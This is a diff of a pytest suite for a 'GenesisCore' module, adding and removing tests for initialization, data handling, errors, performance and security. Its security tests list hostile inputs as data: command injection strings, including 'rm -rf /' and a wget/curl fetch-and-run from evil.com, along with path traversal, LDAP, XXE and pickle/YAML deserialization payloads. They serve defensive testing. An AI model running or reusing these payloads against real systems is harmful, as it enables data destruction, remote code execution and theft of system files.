@@ -1033,103 +1033,451 @@ if __name__ == "__main__":
         "--durations=10"  # Show 10 slowest tests
     ])
 
-# Additional comprehensive test classes
+# ============================================================================
+# ADDITIONAL COMPREHENSIVE TESTS FOR GENESIS CORE
+# ============================================================================
 
-class TestGenesisCoreAdvancedErrorHandling:
-    """Advanced error handling test scenarios."""
+class TestGenesisCoreAdvancedInitialization:
+    """Advanced initialization tests covering more edge cases."""
     
-    def setup_method(self):
-        self.core = GenesisCore()
-    
-    def test_cascading_error_scenarios(self):
-        """Test how the system handles cascading errors."""
-        with patch.object(self.core, 'make_request') as mock_request:
-            # Simulate multiple error types in sequence
-            mock_request.side_effect = [
-                ConnectionError("Network down"),
-                Timeout("Request timeout"),
-                HTTPError("Server error"),
-                {"status": "success"}
-            ]
-            
-            # Should eventually succeed after retries
-            result = self.core.make_request("https://api.example.com")
-            assert result is not None
-    
-    def test_memory_error_handling(self):
-        """Test handling of memory-related errors."""
-        with patch.object(self.core, 'process_data') as mock_process:
-            mock_process.side_effect = MemoryError("Out of memory")
-            
-            try:
-                result = self.core.process_data("large_data")
-                # Should handle memory errors gracefully
-                assert result is None or isinstance(result, dict)
-            except MemoryError:
-                # Acceptable if memory error is re-raised with context
-                pass
-    
-    def test_unicode_error_handling(self):
-        """Test handling of Unicode encoding/decoding errors."""
-        problematic_unicode = [
-            b'\x80\x81\x82\x83',  # Invalid UTF-8
-            "test\udcff",  # Surrogate characters
-            "\x00\x01\x02\x03",  # Control characters
+    def test_initialization_with_invalid_types(self):
+        """Test initialization with various invalid configuration types."""
+        invalid_configs = [
+            123,  # Integer instead of dict
+            "string_config",  # String instead of dict
+            [],  # List instead of dict
+            set(),  # Set instead of dict
+            lambda x: x,  # Function
+            object(),  # Generic object
         ]
         
-        for problematic_data in problematic_unicode:
-            try:
-                result = self.core.process_data(problematic_data)
-                assert result is not None
-            except UnicodeError:
-                # Acceptable if Unicode errors are handled appropriately
-                pass
+        for invalid_config in invalid_configs:
+            # Should handle invalid types gracefully
+            if isinstance(invalid_config, (int, str, list, set)):
+                core = GenesisCore(config=invalid_config)
+                assert core is not None
+            else:
+                with pytest.raises((TypeError, ValueError)):
+                    GenesisCore(config=invalid_config)
     
-    def test_circular_reference_handling(self):
-        """Test handling of circular references in data structures."""
-        circular_dict = {"key": "value"}
-        circular_dict["self"] = circular_dict
+    def test_initialization_with_nested_config(self):
+        """Test initialization with deeply nested configuration."""
+        nested_config = {
+            'api': {
+                'primary': {
+                    'key': 'primary_key',
+                    'url': 'https://primary.api.com',
+                    'timeout': 30
+                },
+                'fallback': {
+                    'key': 'fallback_key',
+                    'url': 'https://fallback.api.com',
+                    'timeout': 60
+                }
+            },
+            'cache': {
+                'redis': {
+                    'host': 'localhost',
+                    'port': 6379,
+                    'db': 0
+                },
+                'memory': {
+                    'max_size': 1000,
+                    'ttl': 3600
+                }
+            }
+        }
         
-        # Should handle circular references without infinite loops
-        result = self.core.process_data(circular_dict)
-        assert result is not None
+        core = GenesisCore(config=nested_config)
+        assert core.config == nested_config
+        assert core.initialized is True
     
-    def test_deep_recursion_handling(self):
-        """Test handling of deeply nested data structures."""
-        deep_data = {"level": 0}
-        current = deep_data
+    def test_initialization_thread_safety(self):
+        """Test thread safety during initialization."""
+        configs = [
+            {'api_key': f'key_{i}', 'timeout': 30 + i}
+            for i in range(10)
+        ]
         
-        # Create deeply nested structure
-        for i in range(100):
-            current["next"] = {"level": i + 1}
-            current = current["next"]
+        def init_worker(config):
+            return GenesisCore(config=config)
         
-        # Should handle deep nesting without stack overflow
-        result = self.core.process_data(deep_data)
-        assert result is not None
+        with ThreadPoolExecutor(max_workers=5) as executor:
+            futures = [executor.submit(init_worker, config) for config in configs]
+            cores = [f.result() for f in futures]
+        
+        assert len(cores) == 10
+        assert all(core.initialized for core in cores)
+        assert all(core.config['api_key'] == f'key_{i}' for i, core in enumerate(cores))
     
-    def test_file_system_error_handling(self):
-        """Test handling of file system related errors."""
-        with patch('builtins.open', mock_open()) as mock_file:
-            mock_file.side_effect = PermissionError("Access denied")
-            
-            # Should handle file system errors gracefully
-            try:
-                # This would test file operations if implemented
-                result = self.core.process_data("file_path")
-                assert result is not None
-            except PermissionError:
-                # Acceptable if file errors are handled appropriately
-                pass
+    def test_initialization_with_circular_references(self):
+        """Test initialization with circular references in config."""
+        config = {'key': 'value'}
+        config['self'] = config  # Create circular reference
+        
+        # Should handle circular references gracefully
+        core = GenesisCore(config=config)
+        assert core is not None
+        assert 'key' in core.config
 
 
-class TestGenesisCoreAdvancedPerformance:
-    """Advanced performance testing scenarios."""
+class TestGenesisCoreDataProcessingAdvanced:
+    """Advanced data processing tests."""
     
     def setup_method(self):
         self.core = GenesisCore()
     
-    def test_memory_leak_detection(self):
+    def test_process_data_with_callbacks(self):
+        """Test data processing with callback functions."""
+        def callback(data):
+            return f"callback_{data}"
+        
+        test_data = {
+            'value': 'test',
+            'transform': callback
+        }
+        
+        result = self.core.process_data(test_data)
+        assert result is not None
+        assert isinstance(result, dict)
+    
+    def test_process_data_with_generators(self):
+        """Test processing of generator objects."""
+        def data_generator():
+            for i in range(5):
+                yield f"item_{i}"
+        
+        gen = data_generator()
+        result = self.core.process_data(gen)
+        assert result is not None
+    
+    def test_process_data_with_iterators(self):
+        """Test processing of various iterator types."""
+        iterators = [
+            iter([1, 2, 3]),
+            iter({'a': 1, 'b': 2}.items()),
+            iter(range(3)),
+            reversed([1, 2, 3])
+        ]
+        
+        for iterator in iterators:
+            result = self.core.process_data(iterator)
+            assert result is not None
+    
+    def test_process_data_with_custom_objects(self):
+        """Test processing of custom objects."""
+        class CustomObject:
+            def __init__(self, value):
+                self.value = value
+            
+            def __str__(self):
+                return f"CustomObject({self.value})"
+        
+        custom_obj = CustomObject("test_value")
+        result = self.core.process_data(custom_obj)
+        assert result is not None
+    
+    def test_process_data_with_dataclasses(self):
+        """Test processing of dataclass objects."""
+        from dataclasses import dataclass
+        
+        @dataclass
+        class TestData:
+            name: str
+            value: int
+            active: bool = True
+        
+        test_obj = TestData("test", 42, True)
+        result = self.core.process_data(test_obj)
+        assert result is not None
+    
+    def test_process_data_with_namedtuples(self):
+        """Test processing of namedtuple objects."""
+        from collections import namedtuple
+        
+        Point = namedtuple('Point', ['x', 'y'])
+        point = Point(1, 2)
+        
+        result = self.core.process_data(point)
+        assert result is not None
+    
+    def test_process_data_streaming(self):
+        """Test streaming data processing."""
+        def stream_data():
+            for i in range(100):
+                yield {"id": i, "data": f"stream_item_{i}"}
+        
+        stream = stream_data()
+        results = []
+        
+        # Process streaming data
+        for item in stream:
+            result = self.core.process_data(item)
+            results.append(result)
+            if len(results) >= 10:  # Process first 10 items
+                break
+        
+        assert len(results) == 10
+        assert all(result is not None for result in results)
+    
+    def test_process_data_with_binary_data(self):
+        """Test processing of binary data."""
+        binary_data = b'\x00\x01\x02\x03\x04\x05'
+        result = self.core.process_data(binary_data)
+        assert result is not None
+    
+    def test_process_data_with_datetime_objects(self):
+        """Test processing of datetime objects."""
+        from datetime import datetime, timedelta
+        
+        now = datetime.now()
+        delta = timedelta(days=1)
+        
+        datetime_data = {
+            'timestamp': now,
+            'duration': delta,
+            'formatted': now.isoformat()
+        }
+        
+        result = self.core.process_data(datetime_data)
+        assert result is not None
+        assert isinstance(result, dict)
+
+
+class TestGenesisCoreErrorHandlingAdvanced:
+    """Advanced error handling tests."""
+    
+    def setup_method(self):
+        self.core = GenesisCore()
+    
+    def test_error_handling_with_retry_logic(self):
+        """Test error handling with retry mechanisms."""
+        attempt_count = 0
+        
+        def failing_operation():
+            nonlocal attempt_count
+            attempt_count += 1
+            if attempt_count < 3:
+                raise ConnectionError("Temporary failure")
+            return {"status": "success", "attempt": attempt_count}
+        
+        with patch.object(self.core, 'make_request', side_effect=failing_operation):
+            result = self.core.make_request("https://api.example.com")
+            # Should succeed after retries
+            assert result is not None
+    
+    def test_error_handling_with_circuit_breaker(self):
+        """Test circuit breaker pattern for error handling."""
+        failure_count = 0
+        
+        def circuit_breaker_test():
+            nonlocal failure_count
+            failure_count += 1
+            if failure_count < 5:
+                raise ConnectionError("Service unavailable")
+            return {"status": "circuit_open"}
+        
+        # Test that circuit breaker opens after multiple failures
+        for i in range(10):
+            try:
+                result = self.core.make_request("https://api.example.com")
+                if result and "circuit_open" in str(result):
+                    break
+            except ConnectionError:
+                continue
+    
+    def test_error_handling_with_graceful_degradation(self):
+        """Test graceful degradation when services are unavailable."""
+        with patch.object(self.core, 'make_request', side_effect=ConnectionError("Service down")):
+            # Should fall back to cached data or default behavior
+            result = self.core.process_data("fallback_test")
+            assert result is not None
+    
+    def test_error_handling_with_partial_failures(self):
+        """Test handling of partial failures in batch operations."""
+        batch_data = [
+            {"id": 1, "data": "valid"},
+            {"id": 2, "data": None},  # This might cause an error
+            {"id": 3, "data": "valid"},
+            {"id": 4, "data": ""},    # This might cause an error
+            {"id": 5, "data": "valid"}
+        ]
+        
+        results = []
+        for item in batch_data:
+            try:
+                result = self.core.process_data(item)
+                results.append(result)
+            except Exception as e:
+                # Should handle partial failures gracefully
+                results.append({"error": str(e), "item": item})
+        
+        assert len(results) == 5
+        # Should have some successful results
+        assert any(result and "error" not in result for result in results if result)
+    
+    def test_error_handling_with_resource_exhaustion(self):
+        """Test handling of resource exhaustion errors."""
+        with patch('psutil.Process') as mock_process:
+            mock_process.return_value.memory_info.return_value.rss = 1000 * 1024 * 1024  # 1GB
+            
+            # Should handle memory pressure gracefully
+            large_data = {"data": "x" * 1000000}  # 1MB string
+            result = self.core.process_data(large_data)
+            assert result is not None
+    
+    def test_error_handling_with_nested_exceptions(self):
+        """Test handling of nested exceptions."""
+        def nested_error():
+            try:
+                raise ValueError("Inner error")
+            except ValueError as e:
+                raise ConnectionError("Outer error") from e
+        
+        with patch.object(self.core, 'make_request', side_effect=nested_error):
+            try:
+                result = self.core.make_request("https://api.example.com")
+                assert result is not None
+            except (ConnectionError, ValueError):
+                # Should handle nested exceptions appropriately
+                pass
+
+
+class TestGenesisCoreSecurityAdvanced:
+    """Advanced security tests."""
+    
+    def setup_method(self):
+        self.core = GenesisCore()
+    
+    def test_security_path_traversal_protection(self):
+        """Test protection against path traversal attacks."""
+        path_traversal_attempts = [
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\system32\\config\\sam",
+            "....//....//....//etc/passwd",
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+            "..%252f..%252f..%252fetc%252fpasswd",
+            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+        ]
+        
+        for attack in path_traversal_attempts:
+            result = self.core.process_data(attack)
+            assert result is not None
+            # Should not contain sensitive file paths
+            assert "etc/passwd" not in str(result)
+            assert "system32" not in str(result)
+    
+    def test_security_command_injection_protection(self):
+        """Test protection against command injection."""
+        command_injection_attempts = [
+            "; rm -rf /",
+            "| cat /etc/passwd",
+            "& del /f /q c:\\",
+            "; wget http://evil.com/malware.sh -O /tmp/malware.sh; chmod +x /tmp/malware.sh; /tmp/malware.sh",
+            "$(curl -s http://evil.com/payload.txt)",
+            "`id`",
+            "${IFS}cat${IFS}/etc/passwd"
+        ]
+        
+        for attack in command_injection_attempts:
+            result = self.core.process_data(attack)
+            assert result is not None
+            # Should not execute commands
+            assert "root:" not in str(result)
+            assert "uid=" not in str(result)
+    
+    def test_security_ldap_injection_protection(self):
+        """Test protection against LDAP injection."""
+        ldap_injection_attempts = [
+            "admin)(&(password=*))",
+            "admin)(&(objectClass=*))",
+            "*)(&(objectClass=*))",
+            "admin)(&(|(password=*)(pass=*)))",
+            "admin)(&(cn=*)(userPassword=*))"
+        ]
+        
+        for attack in ldap_injection_attempts:
+            result = self.core.process_data(attack)
+            assert result is not None
+            # Should sanitize LDAP special characters
+            assert "(&" not in str(result)
+            assert "objectClass" not in str(result)
+    
+    def test_security_xml_injection_protection(self):
+        """Test protection against XML injection and XXE attacks."""
+        xml_injection_attempts = [
+            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
+            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://evil.com/malware">]><root>&test;</root>',
+            '<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://evil.com/malware.xsd">test</root>',
+            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd">%file;]><root></root>'
+        ]
+        
+        for attack in xml_injection_attempts:
+            result = self.core.process_data(attack)
+            assert result is not None
+            # Should not process XML entities
+            assert "file:///" not in str(result)
+            assert "SYSTEM" not in str(result)
+    
+    def test_security_deserialization_protection(self):
+        """Test protection against deserialization attacks."""
+        import pickle
+        import base64
+        
+        # Create a malicious serialized object
+        class MaliciousClass:
+            def __reduce__(self):
+                return (exec, ("print('MALICIOUS CODE EXECUTED')",))
+        
+        malicious_obj = MaliciousClass()
+        serialized = base64.b64encode(pickle.dumps(malicious_obj)).decode()
+        
+        result = self.core.process_data(serialized)
+        assert result is not None
+        # Should not execute malicious code
+        assert "MALICIOUS" not in str(result)
+    
+    def test_security_input_size_limits(self):
+        """Test input size limits to prevent DoS attacks."""
+        # Test extremely large inputs
+        huge_string = "x" * (10 * 1024 * 1024)  # 10MB string
+        huge_dict = {f"key_{i}": "value" * 1000 for i in range(10000)}
+        
+        # Should handle large inputs gracefully without consuming excessive resources
+        start_time = time.time()
+        result_string = self.core.process_data(huge_string)
+        result_dict = self.core.process_data(huge_dict)
+        end_time = time.time()
+        
+        assert result_string is not None
+        assert result_dict is not None
+        assert end_time - start_time < 10.0  # Should complete within reasonable time
+    
+    def test_security_regex_dos_protection(self):
+        """Test protection against ReDoS (Regular Expression Denial of Service)."""
+        # Patterns that could cause catastrophic backtracking
+        redos_patterns = [
+            "a" * 1000 + "X",  # Pattern that doesn't match after many attempts
+            "a" * 1000 + "b" + "a" * 1000,  # Nested quantifiers
+            "(" + "a" * 100 + ")*" + "X",  # Exponential time complexity
+        ]
+        
+        for pattern in redos_patterns:
+            start_time = time.time()
+            result = self.core.process_data(pattern)
+            end_time = time.time()
+            
+            assert result is not None
+            assert end_time - start_time < 1.0  # Should complete quickly
+
+
+class TestGenesisCorePerformanceAdvanced:
+    """Advanced performance tests."""
+    
+    def setup_method(self):
+        self.core = GenesisCore()
+    
+    def test_performance_memory_leaks(self):
         """Test for memory leaks during repeated operations."""
         import gc
         import psutil
@@ -1140,743 +1488,413 @@ class TestGenesisCoreAdvancedPerformance:
         
         # Perform many operations
         for i in range(1000):
-            self.core.process_data(f"test_data_{i}")
+            data = {"iteration": i, "data": "test" * 100}
+            result = self.core.process_data(data)
+            
+            # Force garbage collection every 100 iterations
             if i % 100 == 0:
-                gc.collect()  # Force garbage collection
+                gc.collect()
         
         final_memory = process.memory_info().rss
         memory_increase = final_memory - initial_memory
         
-        # Memory increase should be reasonable (less than 10MB)
-        assert memory_increase < 10 * 1024 * 1024
+        # Memory increase should be minimal
+        assert memory_increase < 100 * 1024 * 1024  # Less than 100MB
     
-    def test_cpu_intensive_operations(self):
-        """Test CPU-intensive operations performance."""
-        import time
-        
-        # Create CPU-intensive data
-        cpu_intensive_data = {
-            "complex_calculation": [i ** 2 for i in range(10000)],
-            "nested_loops": [[j for j in range(100)] for i in range(100)]
-        }
-        
-        start_time = time.time()
-        result = self.core.process_data(cpu_intensive_data)
-        execution_time = time.time() - start_time
-        
-        assert result is not None
-        assert execution_time < 2.0  # Should complete within 2 seconds
-    
-    def test_concurrent_memory_usage(self):
-        """Test memory usage under concurrent load."""
-        import threading
+    def test_performance_cpu_efficiency(self):
+        """Test CPU efficiency under load."""
         import psutil
-        import os
+        import multiprocessing
         
-        process = psutil.Process(os.getpid())
-        memory_before = process.memory_info().rss
+        def cpu_intensive_task():
+            for i in range(10000):
+                self.core.process_data(f"cpu_test_{i}")
         
-        def worker_task(worker_id):
-            for i in range(100):
-                self.core.process_data(f"worker_{worker_id}_data_{i}")
+        # Run CPU-intensive task
+        start_time = time.time()
+        cpu_intensive_task()
+        end_time = time.time()
         
-        threads = []
-        for i in range(10):
-            thread = threading.Thread(target=worker_task, args=(i,))
-            threads.append(thread)
-            thread.start()
+        execution_time = end_time - start_time
         
-        for thread in threads:
-            thread.join()
-        
-        memory_after = process.memory_info().rss
-        memory_increase = memory_after - memory_before
-        
-        # Memory increase should be reasonable even under concurrent load
-        assert memory_increase < 50 * 1024 * 1024  # Less than 50MB
+        # Should complete efficiently
+        assert execution_time < 30.0  # Should complete within 30 seconds
     
-    def test_throughput_measurement(self):
-        """Test system throughput capabilities."""
-        import time
+    def test_performance_concurrent_scalability(self):
+        """Test scalability with increasing concurrent load."""
+        def concurrent_worker(worker_id, num_operations):
+            results = []
+            for i in range(num_operations):
+                result = self.core.process_data(f"worker_{worker_id}_op_{i}")
+                results.append(result)
+            return results
         
-        operations_count = 10000
+        # Test with increasing numbers of concurrent workers
+        for num_workers in [1, 2, 4, 8]:
+            start_time = time.time()
+            
+            with ThreadPoolExecutor(max_workers=num_workers) as executor:
+                futures = [
+                    executor.submit(concurrent_worker, i, 100)
+                    for i in range(num_workers)
+                ]
+                all_results = [f.result() for f in futures]
+            
+            end_time = time.time()
+            execution_time = end_time - start_time
+            
+            # Should scale reasonably with more workers
+            assert execution_time < 60.0  # Should complete within 60 seconds
+            assert len(all_results) == num_workers
+            assert all(len(results) == 100 for results in all_results)
+    
+    def test_performance_io_efficiency(self):
+        """Test I/O efficiency with mock network operations."""
+        def mock_io_operation():
+            # Simulate I/O delay
+            time.sleep(0.01)
+            return self.core.make_request("https://api.example.com")
+        
+        # Test async-like behavior with concurrent I/O
         start_time = time.time()
         
-        for i in range(operations_count):
-            self.core.process_data(f"throughput_test_{i}")
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            futures = [executor.submit(mock_io_operation) for _ in range(50)]
+            results = [f.result() for f in futures]
         
         end_time = time.time()
         execution_time = end_time - start_time
-        throughput = operations_count / execution_time
         
-        # Should achieve reasonable throughput
-        assert throughput > 1000  # At least 1000 operations per second
-        assert execution_time < 15.0  # Should complete within 15 seconds
-    
-    def test_scaling_performance(self):
-        """Test performance scaling with different data sizes."""
-        import time
-        
-        data_sizes = [10, 100, 1000, 10000]
-        execution_times = []
-        
-        for size in data_sizes:
-            test_data = {"items": [f"item_{i}" for i in range(size)]}
-            
-            start_time = time.time()
-            result = self.core.process_data(test_data)
-            execution_time = time.time() - start_time
-            
-            execution_times.append(execution_time)
-            assert result is not None
-        
-        # Performance should scale reasonably (not exponentially)
-        # Each 10x increase shouldn't take more than 10x time
-        for i in range(1, len(execution_times)):
-            scaling_factor = execution_times[i] / execution_times[i-1]
-            assert scaling_factor < 15.0  # Reasonable scaling
+        # Should complete I/O operations efficiently
+        assert execution_time < 5.0  # Should complete within 5 seconds
+        assert len(results) == 50
+        assert all(result is not None for result in results)
 
 
-class TestGenesisCoreAdvancedValidation:
-    """Advanced validation and sanitization tests."""
+class TestGenesisCoreEdgeCasesAdvanced:
+    """Advanced edge case tests."""
     
     def setup_method(self):
         self.core = GenesisCore()
     
-    def test_malformed_json_handling(self):
-        """Test handling of malformed JSON-like strings."""
-        malformed_json_cases = [
-            '{"key": "value"',  # Missing closing brace
-            '{"key": "value",}',  # Trailing comma
-            '{"key": undefined}',  # Undefined value
-            '{key: "value"}',  # Unquoted key
-            '{"key": "value" "key2": "value2"}',  # Missing comma
-        ]
-        
-        for malformed_json in malformed_json_cases:
-            result = self.core.process_data(malformed_json)
-            assert result is not None
-            # Should handle malformed JSON gracefully
-    
-    def test_binary_data_handling(self):
-        """Test handling of binary data."""
-        binary_data_cases = [
-            b'\x00\x01\x02\x03\x04',  # Binary data
-            b'\xff\xfe\xfd\xfc',  # High-value bytes
-            b'Mixed\x00binary\x01data',  # Mixed text and binary
-        ]
-        
-        for binary_data in binary_data_cases:
-            result = self.core.process_data(binary_data)
-            assert result is not None
-            # Should handle binary data appropriately
-    
-    def test_extremely_large_numbers(self):
-        """Test handling of extremely large numbers."""
-        large_numbers = [
-            10**100,  # Googol
-            10**1000,  # Extremely large
-            float('inf'),  # Infinity
-            float('-inf'),  # Negative infinity
-        ]
-        
-        for large_number in large_numbers:
-            try:
-                result = self.core.process_data(large_number)
-                assert result is not None
-            except (OverflowError, ValueError):
-                # Acceptable if large numbers cause overflow
-                pass
-    
-    def test_special_float_values(self):
-        """Test handling of special float values."""
-        import math
-        
-        special_floats = [
-            float('nan'),  # Not a number
+    def test_edge_case_floating_point_precision(self):
+        """Test handling of floating-point precision issues."""
+        precision_cases = [
+            0.1 + 0.2,  # Should be 0.3 but has precision issues
+            1.0 / 3.0,  # Repeating decimal
             float('inf'),  # Positive infinity
             float('-inf'),  # Negative infinity
-            -0.0,  # Negative zero
-            math.pi,  # Pi
-            math.e,  # Euler's number
+            float('nan'),  # Not a number
         ]
         
-        for special_float in special_floats:
-            result = self.core.process_data(special_float)
+        for case in precision_cases:
+            result = self.core.process_data(case)
             assert result is not None
-            # Should handle special float values
+            # Should handle special float values gracefully
     
-    def test_timezone_aware_data(self):
-        """Test handling of timezone-aware datetime data."""
+    def test_edge_case_unicode_normalization(self):
+        """Test Unicode normalization edge cases."""
+        import unicodedata
+        
+        unicode_cases = [
+            "café",  # NFC normalization
+            "cafe\u0301",  # NFD normalization (e + combining accent)
+            "＃hashtagfullwidth",  # Full-width characters
+            "🏳️‍🌈",  # Complex emoji with ZWJ sequences
+            "\u200b\u200c\u200d",  # Zero-width characters
+            "\ufeff",  # BOM character
+        ]
+        
+        for case in unicode_cases:
+            result = self.core.process_data(case)
+            assert result is not None
+            # Should handle various Unicode forms
+    
+    def test_edge_case_timezone_handling(self):
+        """Test timezone handling edge cases."""
         from datetime import datetime, timezone, timedelta
         
         timezone_cases = [
-            datetime.now(timezone.utc),
-            datetime.now(timezone(timedelta(hours=5))),
-            datetime.now(timezone(timedelta(hours=-8))),
+            datetime.now(timezone.utc),  # UTC timezone
+            datetime.now(timezone(timedelta(hours=5.5))),  # Non-standard offset
+            datetime.now(timezone(timedelta(hours=-12))),  # Negative offset
+            datetime.now(timezone(timedelta(hours=14))),  # Extreme positive offset
         ]
         
-        for tz_data in timezone_cases:
-            # Convert to string representation
-            result = self.core.process_data(str(tz_data))
+        for case in timezone_cases:
+            result = self.core.process_data(case)
             assert result is not None
     
-    def test_complex_nested_validation(self):
-        """Test validation of complex nested structures."""
-        complex_data = {
-            "users": [
-                {
-                    "id": 1,
-                    "profile": {
-                        "name": "John Doe",
-                        "preferences": {
-                            "theme": "dark",
-                            "notifications": {
-                                "email": True,
-                                "push": False,
-                                "sms": None
-                            }
-                        }
-                    },
-                    "permissions": ["read", "write", "admin"]
-                }
-            ],
-            "metadata": {
-                "created_at": "2023-01-01T00:00:00Z",
-                "version": "1.0.0",
-                "tags": ["production", "stable"]
-            }
-        }
+    def test_edge_case_recursive_data_structures(self):
+        """Test handling of recursive data structures."""
+        # Create circular reference
+        circular_dict = {"key": "value"}
+        circular_dict["self"] = circular_dict
         
-        result = self.core.validate_input(complex_data)
-        assert result is True
+        # Create circular list
+        circular_list = [1, 2, 3]
+        circular_list.append(circular_list)
         
-        processed_result = self.core.process_data(complex_data)
-        assert processed_result is not None
-        assert isinstance(processed_result, dict)
-
-
-class TestGenesisCoreAdvancedIntegration:
-    """Advanced integration testing scenarios."""
-    
-    def setup_method(self):
-        self.core = GenesisCore()
-    
-    def test_database_integration_simulation(self):
-        """Test database integration scenarios."""
-        with patch('sqlite3.connect') as mock_connect:
-            mock_cursor = Mock()
-            mock_connection = Mock()
-            mock_connection.cursor.return_value = mock_cursor
-            mock_cursor.fetchall.return_value = [("test_data",)]
-            mock_connect.return_value = mock_connection
-            
-            # Simulate database operations
-            result = self.core.process_data("SELECT * FROM test_table")
+        recursive_cases = [circular_dict, circular_list]
+        
+        for case in recursive_cases:
+            result = self.core.process_data(case)
             assert result is not None
+            # Should handle circular references without infinite recursion
     
-    def test_api_integration_with_retries(self):
-        """Test API integration with retry mechanisms."""
-        with patch('requests.get') as mock_get:
-            # Simulate API failures followed by success
-            mock_get.side_effect = [
-                ConnectionError("Connection failed"),
-                Timeout("Request timeout"),
-                Mock(status_code=200, json=lambda: {"success": True})
-            ]
-            
-            result = self.core.make_request("https://api.example.com")
-            assert result is not None
-    
-    def test_file_processing_integration(self):
-        """Test file processing integration scenarios."""
-        with patch('builtins.open', mock_open(read_data='{"test": "data"}')) as mock_file:
-            # Simulate file processing
-            result = self.core.process_data("file_path.json")
-            assert result is not None
-    
-    def test_caching_integration(self):
-        """Test caching system integration."""
-        # Test cache miss, set, and hit cycle
-        cache_key = "test_cache_key"
-        cache_value = {"cached": "data"}
-        
-        # Test cache miss
-        result = self.core.cache_get(cache_key)
-        assert result is None
-        
-        # Test cache set
-        set_result = self.core.cache_set(cache_key, cache_value)
-        assert set_result is True
-        
-        # Test processing with cache
-        processed = self.core.process_data(cache_value)
-        assert processed is not None
-    
-    def test_logging_integration(self):
-        """Test logging system integration."""
-        with patch('logging.getLogger') as mock_logger:
-            mock_logger_instance = Mock()
-            mock_logger.return_value = mock_logger_instance
-            
-            # Perform operations that should trigger logging
-            self.core.process_data("test_data")
-            self.core.validate_input("test_input")
-            
-            # Verify logging was called
-            mock_logger.assert_called()
-    
-    def test_configuration_reload_integration(self):
-        """Test configuration reload scenarios."""
-        initial_config = {"key": "initial_value"}
-        updated_config = {"key": "updated_value"}
-        
-        core_initial = GenesisCore(config=initial_config)
-        assert core_initial.config["key"] == "initial_value"
-        
-        core_updated = GenesisCore(config=updated_config)
-        assert core_updated.config["key"] == "updated_value"
-
-
-class TestGenesisCoreAdvancedSecurity:
-    """Advanced security testing scenarios."""
-    
-    def setup_method(self):
-        self.core = GenesisCore()
-    
-    def test_path_traversal_protection(self):
-        """Test protection against path traversal attacks."""
-        path_traversal_attempts = [
-            "../../../etc/passwd",
-            "..\\..\\..\\windows\\system32\\config\\sam",
-            "/etc/shadow",
-            "C:\\Windows\\System32\\config\\SAM",
-            "....//....//....//etc/passwd",
-        ]
-        
-        for path_attempt in path_traversal_attempts:
-            result = self.core.process_data(path_attempt)
-            assert result is not None
-            # Should not contain sensitive path components
-            assert "/etc/passwd" not in str(result)
-            assert "system32" not in str(result).lower()
-    
-    def test_command_injection_protection(self):
-        """Test protection against command injection attacks."""
-        command_injection_attempts = [
-            "; ls -la",
-            "| cat /etc/passwd",
-            "& dir",
-            "`whoami`",
-            "$(cat /etc/passwd)",
-            "${cat /etc/passwd}",
-        ]
-        
-        for command_attempt in command_injection_attempts:
-            result = self.core.process_data(command_attempt)
-            assert result is not None
-            # Should not contain dangerous command indicators
-            assert "root:" not in str(result)
-            assert "bin:" not in str(result)
-    
-    def test_deserialization_protection(self):
-        """Test protection against deserialization attacks."""
-        dangerous_serialized_data = [
-            b'cos\nsystem\n(S\'ls -la\'\ntR.',  # Pickle payload
-            '!!python/object/apply:os.system ["ls -la"]',  # YAML payload
-        ]
-        
-        for dangerous_data in dangerous_serialized_data:
-            result = self.core.process_data(dangerous_data)
-            assert result is not None
-            # Should handle dangerous serialized data safely
-    
-    def test_xxe_protection(self):
-        """Test protection against XXE attacks."""
-        xxe_payloads = [
-            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><foo>&xxe;</foo>',
-        ]
-        
-        for xxe_payload in xxe_payloads:
-            result = self.core.process_data(xxe_payload)
-            assert result is not None
-            # Should not contain file contents
-            assert "root:" not in str(result)
-    
-    def test_regex_dos_protection(self):
-        """Test protection against ReDoS (Regular Expression Denial of Service)."""
-        regex_dos_payloads = [
-            "a" * 10000 + "X",  # Catastrophic backtracking
-            "(" + "a" * 1000 + ")*" + "b",  # Exponential complexity
-        ]
-        
-        for dos_payload in regex_dos_payloads:
-            start_time = time.time()
-            result = self.core.process_data(dos_payload)
-            execution_time = time.time() - start_time
-            
-            assert result is not None
-            assert execution_time < 1.0  # Should not take too long
-    
-    def test_prototype_pollution_protection(self):
-        """Test protection against prototype pollution-like attacks."""
-        pollution_attempts = [
-            {"__proto__": {"polluted": True}},
-            {"constructor": {"prototype": {"polluted": True}}},
-            {"prototype": {"polluted": True}},
-        ]
-        
-        for pollution_attempt in pollution_attempts:
-            result = self.core.process_data(pollution_attempt)
-            assert result is not None
-            # Should handle prototype pollution attempts safely
-
-
-class TestGenesisCoreAdvancedEdgeCases:
-    """Advanced edge case testing scenarios."""
-    
-    def setup_method(self):
-        self.core = GenesisCore()
-    
-    def test_zero_length_operations(self):
-        """Test operations with zero-length inputs."""
-        zero_length_inputs = [
-            "",  # Empty string
-            [],  # Empty list
-            {},  # Empty dict
-            set(),  # Empty set
-            tuple(),  # Empty tuple
-        ]
-        
-        for zero_input in zero_length_inputs:
-            result = self.core.process_data(zero_input)
-            assert result is not None or result == zero_input
-    
-    def test_single_character_operations(self):
-        """Test operations with single character inputs."""
-        single_chars = [
-            "a", "1", "!", "@", "#", "$", "%", "^", "&", "*",
-            "(", ")", "-", "_", "+", "=", "[", "]", "{", "}",
-            "\\", "|", ";", ":", "'", '"', ",", ".", "<", ">",
-            "/", "?", "~", "`", " ", "\t", "\n", "\r"
-        ]
-        
-        for char in single_chars:
-            result = self.core.process_data(char)
-            assert result is not None
-    
-    def test_boundary_numbers(self):
-        """Test with boundary numeric values."""
+    def test_edge_case_system_limits(self):
+        """Test behavior at system limits."""
         import sys
         
-        boundary_numbers = [
-            0,  # Zero
-            1,  # One
-            -1,  # Negative one
-            sys.maxsize,  # Maximum integer
